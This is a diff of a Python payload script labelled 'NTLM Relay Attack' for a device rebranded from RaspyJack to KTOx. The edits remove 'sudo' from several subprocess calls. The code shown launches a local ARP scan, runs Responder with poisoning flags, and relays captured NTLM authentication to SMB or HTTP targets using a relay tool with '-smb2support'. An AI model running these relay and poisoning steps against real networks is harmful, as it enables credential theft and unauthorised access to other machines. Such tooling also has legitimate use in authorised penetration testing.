@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- NTLM Relay Attack
+KTOx Payload -- NTLM Relay Attack
 ========================================
 Author: 7h30th3r0n3
 
@@ -122,7 +122,7 @@ def _arp_scan(iface):
     # Try arp-scan first
     try:
         result = subprocess.run(
-            ["sudo", "arp-scan", "-I", iface, "--localnet", "-q"],
+            ["arp-scan", "-I", iface, "--localnet", "-q"],
             capture_output=True, text=True, timeout=15,
         )
         for line in result.stdout.splitlines():
@@ -189,8 +189,8 @@ def _start_responder():
 
     try:
         _responder_proc = subprocess.Popen(
-            ["sudo", "python3", RESPONDER_SCRIPT, "-I", iface, "-wrf"],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+            ["python3", RESPONDER_SCRIPT, "-I", iface, "-wrf"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
             cwd=RESPONDER_DIR,
         )
     except Exception as exc:
@@ -236,7 +236,7 @@ def _stop_responder():
         _responder_proc = None
 
     # Kill any remaining Responder processes
-    subprocess.run(["sudo", "pkill", "-f", "Responder.py"],
+    subprocess.run(["pkill", "-f", "Responder.py"],
                    capture_output=True, timeout=5)
 
     with lock:
@@ -338,7 +338,7 @@ def _attempt_relay(target_ip, service):
             proto = "smb" if service == "SMB" else "http"
             target_url = f"{proto}://{target_ip}"
             result = subprocess.run(
-                ["sudo", "python3", relay_bin, "-t", target_url, "-smb2support"],
+                ["python3", relay_bin, "-t", target_url, "-smb2support"],
                 capture_output=True, text=True, timeout=30,
             )
             if "success" in result.stdout.lower():
